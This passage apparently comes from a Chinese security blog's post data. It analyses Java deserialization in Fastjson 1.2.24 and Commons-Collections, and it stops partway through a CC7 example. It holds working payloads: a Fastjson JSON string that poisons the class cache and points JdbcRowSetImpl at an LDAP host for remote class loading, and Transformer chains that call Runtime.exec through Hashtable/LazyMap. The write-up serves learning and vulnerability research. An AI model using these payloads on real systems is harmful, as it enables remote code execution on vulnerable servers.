第一处，是在TypeUtils这个类进行初始化的时候，会先往里面放值，会把一些默认的内置类放进去，这里都没办法控制 那么这里只能看看第二处，这是TypeUtils#loadClass这个方法中 可以看到这里put的参数，就是loadClass接收的参数，那么现在就需要考虑怎么把恶意类传入到loadClass，然后放到缓存中 所以这里还需要寻找loadClass被调用点中可控的地方 在MiscCodec#deserialze中找到了调用点，这个类实现了ObjectSerializer和ObjectDeserializer，也就是这个类实际上是一个序列化和反序列化器 当参数clazz是Class.class时，就会调用到loadClass，而deserialze，在fastjson中获取到反序列化器之后会被调用 在fastjson1.2.24中，我们一般调用的是JavaBeanDeserializer这个反序列化器，但是在初始化的时候放入了很多默认的反序列化器，其中就包括当前这个类 其中调用了MiscCodec反序列化器的包括以下类: 12345678910111213141516deserializers.put(SimpleDateFormat.class, MiscCodec.instance);deserializers.put(Class.class, MiscCodec.instance);deserializers.put(UUID.class, MiscCodec.instance);deserializers.put(TimeZone.class, MiscCodec.instance);deserializers.put(Locale.class, MiscCodec.instance);deserializers.put(Currency.class, MiscCodec.instance);deserializers.put(InetAddress.class, MiscCodec.instance);deserializers.put(Inet4Address.class, MiscCodec.instance);deserializers.put(Inet6Address.class, MiscCodec.instance);deserializers.put(InetSocketAddress.class, MiscCodec.instance);deserializers.put(File.class, MiscCodec.instance);deserializers.put(URI.class, MiscCodec.instance);deserializers.put(URL.class, MiscCodec.instance);deserializers.put(Pattern.class, MiscCodec.instance);deserializers.put(Charset.class, MiscCodec.instance);deserializers.put(JSONPath.class, MiscCodec.instance); 也就是说，如果fsatjson要反序列化的类是上面列出的这些类，就会调用到这个MiscCodec这个反序列化器，当反序列化的类属于Class.class这个类，就会调用到MiscCodec反序列化器中的loadClass，然后这个loadClass会把类进行加载，加载后放入到缓存中 然后fastjson在缓存中找到类之后，就会进行返回，从而绕过一些类型检查 绕过EXP那么这里怎么构造EXP已经相对比较清晰了，分为两步 反序列化一个class类，值为恶意类 接着用之前的payload 最终EXP如下： 12String s = &quot;&#123;&#123;\\&quot;@type\\&quot;: \\&quot;java.lang.Class\\&quot;, \\&quot;val\\&quot;: \\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;&#125;, &#123;\\&quot;@type\\&quot;: \\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;, \\&quot;DataSourceName\\&quot;: \\&quot;ldap://192.168.139.128:8085/MxRchSex\\&quot;, \\&quot;AutoCommit\\&quot;: false&#125;&#125;&quot;;JSON.parseObject(s); 这里还存在几个问题 问题1：为什么Class的值后面的参数值是val？ 在MiscCodec中的这个判断处，这里和lexer的词法解析相关，总之这里必须是val，不然就会报错。 问题2：为什么一个大json里面套两个小json，第二个json会执行 这里还是和lexer解析相关。在之前的DefaultJSONParser#parseObject里面会直接匹配到@type也就是如下代码 现在双写&#123;之后，ch值产生了变化，会先进入前面的某个判断，具体如下，这里执行完毕才会继续向下执行。","categories":[],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"FastJson反序列化","slug":"FastJson反序列化","permalink":"http://example.com/tags/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"浅述Fastjson(1)：FastJson反序列化流程分析","slug":"FastJson反序列化流程分析","date":"2025-08-03T11:39:42.000Z","updated":"2025-08-04T15:23:55.196Z","comments":true,"path":"2025/08/03/FastJson反序列化流程分析/","permalink":"http://example.com/2025/08/03/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/","excerpt":"","text":"环境准备直接在pom.xml文件中添加fastjson的maven坐标 12345&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.24&lt;/version&gt;&lt;/dependency&gt; 新建一个类用来作为json的对象，这里面会输出构造方法、setter/getter方法的调用信息 1234567891011121314151617181920212223242526272829303132333435public class Person &#123; private String name; private int age; public Person(String name, int age) &#123; this.name = name; this.age = age; System.out.println(&quot;全参构造&quot;); &#125; public Person() &#123; System.out.println(&quot;无参构造&quot;); &#125; public String getName() &#123; System.out.println(&quot;getName&quot;); return name; &#125; public void setName(String name) &#123; System.out.println(&quot;setName&quot;); this.name = name; &#125; public int getAge() &#123; System.out.println(&quot;getAge&quot;); return age; &#125; public void setAge(int age) &#123; System.out.println(&quot;setAge&quot;); this.age = age; &#125;&#125; 调用fastjson，fastjson将json转为对象有两个方法，parse、parseObject，这两者的区别在后续就能看到。这里采用parseObject。 12345678public class JSON124 &#123; public static void main(String[] args) &#123; String s = &quot;&#123;\\&quot;@type\\&quot;: \\&quot;Person\\&quot;, \\&quot;age\\&quot;: 18, \\&quot;name\\&quot;: \\&quot;ttt\\&quot;&#125;&quot;; JSONObject json = JSON.parseObject(s); &#125;&#125; 运行一下，能够看到调用了无参构造、setter/getter方法 那么正式开始分析。 流程分析方法起始点直接进入parseObject方法，可以看到这里先是调用了parse方法获取了一个对象，这个对象其实就是获取的Person对象，然后将这个对象又转为了JSONObject对象进行返回，这个JSONObject其实就是一个Map。 这里parseObject方法中调用的parse和parse方法是同一个方法，具体区别就是在parseObject中是将获取的对象又转为了JSONObject。 进入这个parse，又在调用parse，进入这个第二个parse方法，这里先是创建了一个默认的JSON解析器DefaultJSONParser，然后调用这个解析器的parse方法 1234567891011121314public static Object parse(String text, int features) &#123; if (text == null) &#123; return null; &#125; DefaultJSONParser parser = new DefaultJSONParser(text, ParserConfig.getGlobalInstance(), features); Object value = parser.parse(); parser.handleResovleTask(value); parser.close(); return value;&#125; 核心逻辑部分进入这个parse方法，里面调用了DefaultJSONParser#parse方法，进入这个方法，核心逻辑都在这里 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384public Object parse(Object fieldName) &#123; final JSONLexer lexer = this.lexer; switch (lexer.token()) &#123; case SET: lexer.nextToken(); HashSet&lt;Object&gt; set = new HashSet&lt;Object&gt;(); parseArray(set, fieldName); return set; case TREE_SET: lexer.nextToken(); TreeSet&lt;Object&gt; treeSet = new TreeSet&lt;Object&gt;(); parseArray(treeSet, fieldName); return treeSet; case LBRACKET: JSONArray array = new JSONArray(); parseArray(array, fieldName); if (lexer.isEnabled(Feature.UseObjectArray)) &#123; return array.toArray(); &#125; return array; case LBRACE: JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField)); return parseObject(object, fieldName); case LITERAL_INT: Number intValue = lexer.integerValue(); lexer.nextToken(); return intValue; case LITERAL_FLOAT: Object value = lexer.decimalValue(lexer.isEnabled(Feature.UseBigDecimal)); lexer.nextToken(); return value; case LITERAL_STRING: String stringLiteral = lexer.stringVal(); lexer.nextToken(JSONToken.COMMA); if (lexer.isEnabled(Feature.AllowISO8601DateFormat)) &#123; JSONScanner iso8601Lexer = new JSONScanner(stringLiteral); try &#123; if (iso8601Lexer.scanISO8601DateIfMatch()) &#123; return iso8601Lexer.getCalendar().getTime(); &#125; &#125; finally &#123; iso8601Lexer.close(); &#125; &#125; return stringLiteral; case NULL: lexer.nextToken(); return null; case UNDEFINED: lexer.nextToken(); return null; case TRUE: lexer.nextToken(); return Boolean.TRUE; case FALSE: lexer.nextToken(); return Boolean.FALSE; case NEW: lexer.nextToken(JSONToken.IDENTIFIER); if (lexer.token() != JSONToken.IDENTIFIER) &#123; throw new JSONException(&quot;syntax error&quot;); &#125; lexer.nextToken(JSONToken.LPAREN); accept(JSONToken.LPAREN); long time = ((Number) lexer.integerValue()).longValue(); accept(JSONToken.LITERAL_INT); accept(JSONToken.RPAREN); return new Date(time); case EOF: if (lexer.isBlankInput()) &#123; return null; &#125; throw new JSONException(&quot;unterminated json string, &quot; + lexer.info()); case ERROR: default: throw new JSONException(&quot;syntax error, &quot; + lexer.info()); &#125;&#125; 可以看到这里是主要是针对lexer.token的逻辑操作，这个lexer.token是什么呢？ lexer.tokenlexer是一个词法分析器，而lexer.token是分析器处理后的基本单位，可以看到这里面包含很多信息 token可以类比于一个指针，指向对应的字符，token中包含了当前标记类型、具体值、位置等信息。比如这里token为12，12表示&#123;这个符号，当使用lexer.nextToken等代码之后，就会移动向下一个词法，比如&#123;&quot;aaa&quot;&#125;，这里第一次是&#123;，&quot;会识别为字符串的开始，然后读取的就是aaa，最后读取到&#125; 说完lexer.token，回到fastjson代码中，当前lexer.token获取到的是&#123;符号，就会进入LBRACE这个case 这里新建了一个JSONObject对象，然后返回时执行了parseObject 进入parseObject这个方法看看，可以看到，当前两个参数都都没有。看看这段代码，前面几个if都是判断边界值，不太重要直接跳过 然后会进入一个for(; ; )死循环，只有当运行到break或者是return之类的操作才会跳出循环 查看这部分死循环的代码可以看到是通过lexer.getCurrent读取到当前正在处理的词法为&quot;，那么就会进入到if (ch == &#39;&quot;&#39;) 这个判断 这里lexer.getCurrent是返回当前正在处理的具体字符，字符串开始时，当前字符就是双引号。而lexer.token时标记类型的数值表示，二者是不同的。 在这个判断中，通过lexer.scanSymbol(symbolTable, &#39;&quot;&#39;);从当前字符位置读取，直到遇到&quot;位置，那么这里key就是@type这几个字符 继续往下执行，会进行到如下部分代码，这里判断key是否为一个常量，而这个常量就是@type,也就是说这里就是指定类进行反序列化的关键。那么进入这里的代码，就表示要做java反序列化而不仅仅是json反序列化 TypeUtils.loadClass代码中可以看到，首先就执行了loadClass这个方法，那么进入这个方法看看。 可以看到这里接收到的className，就是Person类 然后通过mappings.get(className);，通过这个方法在缓存中查找类，但是这里没有找到，所以clazz的值为null，继续往下运行 可以看到，这里还存在两个判断，如果第一位是中括号，表示是数组，就使用数组的方法。如果类名前面是L，后面是;，就去掉然后重新调用当前方法。 这里会帮助后续的一些绕过，这里暂时先不看，继续往下运行。 在下面代码中获得当前上下文的classLoader，然后用AppClassLoader这个类加载器进行加载，加载完成后放到缓存中再返回，就跳出了死循环与loadClass方法，拿到了Class对象。这个clazz对象就是反射中获取的类文件，可以执行反射的后续操作。 回到DefaultJSONParser#parseObject方法。 此时已经拿到了TypeUtils.loadClass(typeName, config.getDefaultClassLoader());执行获得的clazz对象 继续往下运行，会直接运行到if (object.size() &gt; 0)这个判断。 这里的object是当前方法接收到的参数，当前接收到的参数为0，所以这里直接跳过 往下执行，这里获取一个反序列化器，然后通过反序列化器进行反序列化，这一段是比较重要的，前面都是解析器进行解析的部分，都是基于字符串的操作。由于之前进入了@type的逻辑，所以这里是按照java的方法进行java对象解析。 ParseConfig#getDeserializer进入ParseConfig#getDeserializer这个方法，第一行代码this.derializers.get(type);也是在缓存中查找对应的反序列化器。 在derializers中，这个类初始化的时候就会将一些系统内置类对应的反序列化器进行载入。 继续往下执行，进入if (type instanceof Class&lt;?&gt;) 这个判断，这里返回时会执行getDeserializer这个操作，进入这里看看。 这里的type参数就是前面获取的clazz对象 前面两个判断都是在缓存中查找，这里没有，继续往下执行，这里会进入for (int i = 0; i &lt; denyList.length; ++i)，这里就是默认的黑名单。也就是说在漏洞爆出来之前就存在于一个黑名单，但是这个黑名单中只有线程相关的类。这个黑名单可能是出于性能上的考虑。 我们当前的类名是Person，自然不会匹配到黑名单。 继续往下执行，这里是根据包名来选择对应的处理 我们这里都不满足，所以继续向下执行，执行到if (clazz.isEnum())这里的判断，这里都不满足，会执行到最后的else里面 然后会执行到createJavaBeanDeserializer(clazz, type);这部分代码，这个方法把类当成JavaBean来解析，进入这个方法 ParseConfig#createJavaBeanDeserializer方法的第一行代码中的asmEnable是java底层中的一个动态创建类动态加载的技术，默认为true，后面的判断是根据情况来决定是否支持这个技术。 JavaBeanInfo一直往下执行，执行到JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy); 进入这个Build方法，这里是在了解这个类的内容，比如getter/setter方法，然后组成一个JavaBeanInfo 继续向下执行，会看到方法中存在三个for循环 根据方法名可知，这里分别在遍历set方法、类的属性、get方法。 遍历set方法这里在获取要加载类的所有set方法，然后判断这个方法名是否小于4、是否为static、返回值是否为void或它本身，最后还必须满足set开头 当经过这些判断之后，会获取第4个字符，也就是setName中的N 然后再通过Character.toLowerCase将所有字符转为小写，后面还判断了_、f、is等字符，这里是为了兼容特殊写法，对整个逻辑没有影响。 执行完这些操作之后，会通过TypeUtils.getField(clazz, propertyName, declaredFields);去clazz查找propertyName的字段，然后返回Field对象 继续向下执行，在循环的最后有一个add方法的调用，这里面又执行了new FieldInfo这个操作 查看new FieldInfo，这里面设置了一个getOnly的属性为false，这里需要注意，可能会对后续利用造成影响。如果要设置为true，那么方法的参数就不能为1 执行完set方法的循环（遍历过程中会遇到一些内置方法），接下来会执行到属性循环 遍历属性这里是获取public修饰的属性，但是目标类并没有这类属性，所以这里不会进入循环。 遍历get方法进入遍历get方法的代码。 这里其实和遍历get的差别不大，需要满足方法名长度大于4、方法不为静态方法、方法参数为0 但是在add之前新增了一个if判断。就是get方法的返回值需要满足指定的类型。 满足之后才会进行add，但是我们这里都不满足。那么就不会执行到后续代码 这里其实是在为Bean对象找到类中的属性，以及对应的set方法，这里没有get方法，和上面的遍历有关，反序列化是赋值，只有不存在set方法，才会去寻找get 当遍历完方法和属性之后，会返回一个JavaBeanInfo对象 回到ParseConfig#createJavaBeanDeserializer方法中，这里拿到了build方法构建的Bean 然后后面的判断都是根据这个Bean的情况，去选择是否关闭ASM 其中存在一个判断，if (fieldInfo.getOnly)，满足getOnly就会关闭ASM 这个ASM在这里的作用是什么呢？ 在下面有一个判断，如果ASM是关闭状态，就会创建一个JavaBeanDeserializer，就是使用系统内置的反序列化器 反之则是调用asmFactory.createJavaBeanDeserializer临时创建一个类作为反序列化器 这个临时反序列化器没办法进行调试，不能看到反序列化是如何操作的 也就是说要想看到fastjson是如何进行反序列化的，那么就需要进入系统内置的反序列化器 那么我们这里想办法改变getOnly的属性即可。 关闭getOnly要关闭getOnly,只有一个地方 1234567891011# FieldInfo#FieldInfoif (method != null) &#123; Class&lt;?&gt;[] types; if ((types = method.getParameterTypes()).length == 1) &#123; fieldClass = types[0]; fieldType = method.getGenericParameterTypes()[0]; &#125; else &#123; fieldClass = method.getReturnType(); fieldType = method.getGenericReturnType(); getOnly = true; &#125; 这里需要满足method != null，然后不满足(types = method.getParameterTypes()).length == 1，也就是说一个方法的参数不能为1。 但是这里还存在一个问题。设置getOnly的地方在FieldInfo#FieldInfo中，这里是从遍历set方法时进入add方法调用到的,并且在进行add之前，还存在一个判断 1234Class&lt;?&gt;[] types = method.getParameterTypes();if (types.length != 1) &#123; continue;&#125; 如果参数个数不为1，直接跳出循环，也就是说遍历set时根本没办法满足条件，那么只能从遍历get方法处进行。 遍历get时要进入add方法，那么就需要满足其中的条件，也就是说返回值要满足指定类型。那么这里就给Person类新增一个属性，这个属性只有一个get方法。 此时再次开始调试，在设置getOnly的地方打上断点，发现能够满足条件设置getOnly为true，此时已经能够拿到JavaBeanDeserializer 当前过程分析 使用fastjson反序列化时，会满足case LBRACE这个条件，然后按照字符串进行解析 按照字符串解析时，发现存在@type，然后按照Java对象进行反序列化 按照java反序列化需要一个反序列化器 前面获取到了反序列化器，后面就会调用这个反序列化器的反序列化方法 JavaBeanDeserializer.deserialze此时拿到了Java内置序列化器的反序列化器了，然后通过这个反序列化器的deserialze进行反序列化，我们来看看这里面是怎么调用到无参构造和setter方法的 进入deserialze方法，也是层层调用，直接进入最后调用到的方法。 继续执行，会经过一系列判断，这里基本都不满足，直接向下执行 执行到循环for (int fieldIndex = 0;; fieldIndex++) 处，这里就是在遍历所有的字段 中间会存在很多类型判断 执行无参构造和set方法一直向下执行，执行到if (object == null &amp;&amp; fieldValues == null) 这个判断，这里会执行createInstance这个方法 这个方法会判断目标类是接口还是什么，如果是接口就创建动态代理 如果不是接口，就通过newInstance创建实例 在创建实例的过程时就触发了无参构造 获取到实例之后，在后续的判断中会进入一个setVlue方法 这里是执行到boolean match = parseField(parser, key, object, type, fieldValues);，进入parseField方法，又执行到fieldDeserializer.parseField方法，然后再parseField这个方法中会执行到setValue 在setValue中通过反射完成了赋值 比如说当前method为setAge，Object是前面创建的实例，value则是反序列化字符串传递的参数 执行完这个方法，就能在控制台看到set方法被执行 get方法的执行这里只看到执行了set方法，那么get方法在哪执行呢？ 前面说过，parseObject和parse方法的区别是，parseObject返回的时候是转为JSONObject，get方法就是在这个过程中被调用的。 进入toJSON方法 这里经过层层调用，进入了如下代码 一直向下执行，会执行到ObjectSerializer serializer = config.getObjectWriter(clazz);这里，进入getObjectWriter方法，在getObjectWriter方法中，会执行到put(clazz, createJavaBeanSerializer(clazz));方法 进入createJavaBeanSerializer方法，这里调用了TypeUtils.buildBeanInfo(clazz, null, propertyNamingStrategy); 进入buildBeanInfo方法，这里找到属性以及对应的方法 返回到JSON类中，在ObjectSerializer serializer = config.getObjectWriter(clazz);执行结束后，继续向下执行，执行到Map&lt;String, Object&gt; values = javaBeanSerializer.getFieldValuesMap(javaObject);时，进入getFieldValuesMap方法 可以看到这里执行了一个getter.getPropertyValue(object)方法 进入getPropertyValue方法，会执行fieldInfo.get这个方法，在这个方法中可以看到，也是通过method.invoke方法来执行 简易流程图 总结在fastjson反序列化时，会通过invoke去调用set方法进行赋值，如果使用了parseObject，那么还会调用get方法获取值。 如果反序列化时字符串中某个属性符合getOnly的要求，那么这个属性的get方法会在set的时候调用。这里是因为某些属性被transient修饰时，一定会写get方法，还原对象时通过get方法来还原值。 如果找到一个恶意的set方法，那么把这个方法所在类按照格式传入即可。","categories":[],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"FastJson反序列化","slug":"FastJson反序列化","permalink":"http://example.com/tags/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"CC链总结","slug":"CC链总结","date":"2025-07-21T15:31:18.000Z","updated":"2025-07-21T16:13:10.277Z","comments":true,"path":"2025/07/21/CC链总结/","permalink":"http://example.com/2025/07/21/CC%E9%93%BE%E6%80%BB%E7%BB%93/","excerpt":"","text":"CC链1-7利用链概述由于我自己写的部分CC链中进行了一定修改，所以这里采用yso中的链 这张图大概描述了CC链1-7的调用过程仔细观察能够发现，都是反序列化入口-&gt;调用点-&gt;执行点这种规律，部分链甚至是基于其他链进行拆分组合 CC链的其他问题CC链1是如何修复的CC链1-TransformedMap在jdk8u71版本中就被修复了，查看8u71的AnnotationInvocationHandler#readObject与8u65版本进行对比 在8u65中，我们是通过memberValue.setValue触发，而memberValue来自于构造方法中memberValues遍历获得 在8u71中，memberValue来自于streamVals，而streamVals是在Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(&quot;memberValues&quot;, null);获取的，而我们无法控制这里，所以这条链就中断了。而LazyMap链则不受此修改影响 其他后续补充","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"CC链","slug":"CC链","permalink":"http://example.com/tags/CC%E9%93%BE/"}]},{"title":"浅述CC链(8)：CC链7","slug":"CC链7","date":"2025-07-20T11:37:04.000Z","updated":"2025-07-21T15:25:33.078Z","comments":true,"path":"2025/07/20/CC链7/","permalink":"http://example.com/2025/07/20/CC%E9%93%BE7/","excerpt":"","text":"CC链7CC链7同样是在LazyMap#get的基础上进行了修改，这里找到的调用点找到了AbstractMap#equals这里，然后会被AbstractMapDecorator#equals调用，AbstractMapDecorator#equals又被Hashtable#reconstitutionPut调用。这里涉及到装饰器的设计模式，中间的调用不是之前那种直接查找用法。 简单来说： 执行lazyMap.equals时，LazyMap本身没有equals，但是继承了AbstractMapDecorator这个装饰器，所以会去执行AbstractMapDecorator中的equals，但是AbstractMapDecorator中没有自己重写equals方法，而AbstractMapDecorator这个装饰器是装饰了AbstractMap这个类，那么就会调用到AbstractMap#equals。 这里如果是xxxMapDecorator，这个xxxMapDecorator没有重写xxx方法，就会执行到xxxMap本身的xxx方法 调用点：AbstractMap#equalsAbstractMap#equals方法实现如下： 1234567891011121314151617181920212223242526272829303132public boolean equals(Object o) &#123; if (o == this) return true; if (!(o instanceof Map)) return false; Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o; if (m.size() != size()) return false; try &#123; Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator(); while (i.hasNext()) &#123; Entry&lt;K,V&gt; e = i.next(); K key = e.getKey(); V value = e.getValue(); if (value == null) &#123; if (!(m.get(key)==null &amp;&amp; m.containsKey(key))) return false; &#125; else &#123; if (!value.equals(m.get(key))) return false; &#125; &#125; &#125; catch (ClassCastException unused) &#123; return false; &#125; catch (NullPointerException unused) &#123; return false; &#125; return true;&#125; 这里的equals中有一个m.get，这里的m来自于Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;，o是我们传入的对象，也就是说要给equals中传入恶意的Map。那么这里就是lazyMap1.equals(Map)，需要两个lazyMap，其中lazyMap2是我们构造的恶意map 此时尝试一下构造exp，执行之后能够弹出计算器，则没有问题， 1234567891011121314151617181920212223public static void main(String[] args) &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // 恶意的LazyMap，放入equals中的 HashMap&lt;Object, Object&gt; hMap1 = new HashMap&lt;&gt;(); hMap1.put(&quot;key1&quot;, &quot;value1&quot;); LazyMap decorateEXP = (LazyMap) LazyMap.decorate(hMap1, chainedTransformer); // 普通LazyMap，用来调用equals HashMap&lt;Object, Object&gt; hMap2 = new HashMap&lt;&gt;(); hMap2.put(&quot;key2&quot;, &quot;value2&quot;); Map decorate = LazyMap.decorate(hMap2, new ConstantTransformer(1)); if (decorate.equals(decorateEXP)) &#123; System.out.println(&quot;test&quot;); &#125;&#125; 需要注意的是：在AbstractMap#equals中存在的if判断基本不需要绕过，这里不管是否为null，都会调用到m.get，这里的value来自于hMap2中的value，也可以直接把这个值写为null 1234567if (value == null) &#123; if (!(m.get(key)==null &amp;&amp; m.containsKey(key))) return false;&#125; else &#123; if (!value.equals(m.get(key))) return false;&#125; 那么接下来，我们需要去寻找能够执行到AbstractMapDecorator#equals的地方，或者说接收任意Map为参数，并且用这个参数调用了equals的地方 调用点：Hashtable#reconstitutionPut在Hashtable#reconstitutionPut中存在一处调用 123456789101112131415161718192021private void reconstitutionPut(Entry&lt;?,?&gt;[] tab, K key, V value) throws StreamCorruptedException&#123; if (value == null) &#123; throw new java.io.StreamCorruptedException(); &#125; // Makes sure the key is not already in the hashtable. // This should not happen in deserialized version. int hash = key.hashCode(); int index = (hash &amp; 0x7FFFFFFF) % tab.length; for (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) &#123; if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123; throw new java.io.StreamCorruptedException(); &#125; &#125; // Creates the new entry. @SuppressWarnings(&quot;unchecked&quot;) Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index]; tab[index] = new Entry&lt;&gt;(hash, key, value, e); count++;&#125; 其中key的属性为K，而K是一个泛型，可以是一个非基本类型的任意的引用类型，也就可以是一个Map 代码中调用equals的地方在e.key.equals(key)，这里的e是一个链表中的节点，是Hashtable内部数组tab中某个桶链表上的节点对象。可以简单类比于for (int i = 0; i &lt; 10; i++) &#123;list[i]&#125;中的list[i]。 而这里的key则是该方法接收的参数，并且这里是key.equals(key),那么这里是否会对反序列化造成影响，还需要后续查看 那么接下来就查找该方法的调用 反序列化入口：Hashtable#readObject在当前类的readObject方法中找到了reconstitutionPut的调用 123456789101112131415161718192021222324252627282930313233private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException&#123; // Read in the length, threshold, and loadfactor s.defaultReadObject(); // Read the original length of the array and number of elements int origlength = s.readInt(); int elements = s.readInt(); // Compute new size with a bit of room 5% to grow but // no larger than the original size. Make the length // odd if it&#x27;s large enough, this helps distribute the entries. // Guard against the length ending up zero, that&#x27;s not valid. int length = (int)(elements * loadFactor) + (elements / 20) + 3; if (length &gt; elements &amp;&amp; (length &amp; 1) == 0) length--; if (origlength &gt; 0 &amp;&amp; length &gt; origlength) length = origlength; table = new Entry&lt;?,?&gt;[length]; threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1); count = 0; // Read the number of elements and then all the key/value objects for (; elements &gt; 0; elements--) &#123; @SuppressWarnings(&quot;unchecked&quot;) K key = (K)s.readObject(); @SuppressWarnings(&quot;unchecked&quot;) V value = (V)s.readObject(); // synch could be eliminated for performance reconstitutionPut(table, key, value); &#125;&#125; 其中key来自于(K)s.readObject();，当前类Hashtable实现了Map接口，可以说也是一个Map类型，那么key就是传入Hashtable中的键名key 可以尝试构造下EXP，看看有没有什么问题 构造EXP那么构造如来的EXP如下，新建一个Hashtable，并将构造的恶意LazyMap作为键名传入 123456789101112131415161718192021222324public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // 恶意的LazyMap，放入equals中的 HashMap&lt;Object, Object&gt; hMap1 = new HashMap&lt;&gt;(); hMap1.put(&quot;key1&quot;, &quot;value1&quot;); LazyMap decorateEXP = (LazyMap) LazyMap.decorate(hMap1, chainedTransformer); // 普通LazyMap，用来调用equals //HashMap&lt;Object, Object&gt; hMap2 = new HashMap&lt;&gt;(); //hMap2.put(&quot;key2&quot;, &quot;value2&quot;); //Map decorate = LazyMap.decorate(hMap2, new ConstantTransformer(1)); Hashtable&lt;Object, Object&gt; tableMap = new Hashtable&lt;&gt;(); tableMap.put(decorateEXP, &quot;tableMapValue&quot;); //util.serialize(tableMap); util.unserialize(&quot;ser.bin&quot;); &#125; 但是执行之后发现反序列化并没有弹出计算器，通过动态调试看看问题在哪 动态调试时发现，当前代码反序列化时在reconstitutionPut方法处根本不会进入循环 根据调试信息，tab中所有元素都为null，这个tab来自于该方法接收到的参数，而这个参数在readObject中进行创建 也就是说我们当前运行到reconstitutionPut方法时接收到的参数本身就没有值，根据代码，当reconstitutionPut方法中循环之后才会进行赋值 而这个方法本身在readObject中就是被循环调用的，也么想要能够弹出计算器，至少需要时在readObject中进入第二次循环，此时table才不为null，我们也能够进入reconstitutionPut方法中的for循环 那么看看readObject中循环是如何进行的，这里的循环次数是由elements决定 12345678for (; elements &gt; 0; elements--) &#123; @SuppressWarnings(&quot;unchecked&quot;) K key = (K)s.readObject(); @SuppressWarnings(&quot;unchecked&quot;) V value = (V)s.readObject(); // synch could be eliminated for performance reconstitutionPut(table, key, value);&#125; elements又是通过s.readInt();获取，这里s.readInt()获取到的值是HashTable中存储的键值对个数 也就是说我们需要给HashTable传入两个键值对，并且恶意键值对需要放在第二个。 此时构造出EXP如下： 12345678910111213141516171819202122232425public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // 恶意的LazyMap，放入equals中的 HashMap&lt;Object, Object&gt; hMap1 = new HashMap&lt;&gt;(); hMap1.put(&quot;key1&quot;, &quot;value1&quot;); LazyMap decorateEXP = (LazyMap) LazyMap.decorate(hMap1, chainedTransformer); //普通LazyMap，用来调用equals HashMap&lt;Object, Object&gt; hMap2 = new HashMap&lt;&gt;(); hMap2.put(&quot;key2&quot;, &quot;value2&quot;); //Map decorate = LazyMap.decorate(hMap2, new ConstantTransformer(1)); Hashtable&lt;Object, Object&gt; tableMap = new Hashtable&lt;&gt;(); tableMap.put(hMap2, &quot;value1&quot;); tableMap.put(decorateEXP, &quot;tableMapValue2&quot;); util.serialize(tableMap); util.unserialize(&quot;ser.bin&quot;);&#125; 再次运行，序列化时就弹出计算器，并且伴随报错Exception in thread &quot;main&quot; java.io.WriteAbortedException: writing aborted; java.io.NotSerializableException: java.lang.ProcessImpl出现，也就是说这里时已经把命令执行的结果进行序列化，但是这个结果是一个ProcessImpl，是不支持序列化的，这也会导致反序列化 所以我们需要在序列化时不能执行命令，这好像是LazyMap链的老问题了，还是采用改变利用链的方法，先传入任意一个transformer，然后通过反射修改即可 此时EXP如下， 1234567891011121314151617181920212223242526272829303132333435public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new 